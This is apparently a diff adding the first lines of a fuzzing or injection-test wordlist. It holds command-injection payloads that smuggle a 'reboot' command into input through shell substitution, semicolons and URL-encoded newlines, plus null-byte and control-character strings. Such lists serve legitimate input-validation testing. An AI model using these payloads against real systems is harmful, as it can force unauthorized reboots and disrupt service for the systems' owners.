@@ -1,0 +1,11 @@
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+$(reboot)
+$;reboot
+%00
+%00/
+%01%02%03%04%0a%0d%0aADSF
+%01%02%03@%04%0a%0d%0aADSF
+%0a reboot %0a
+%0Areboot
+%0Areboot%0A
+%0DCMD=$'reboot';$CMD
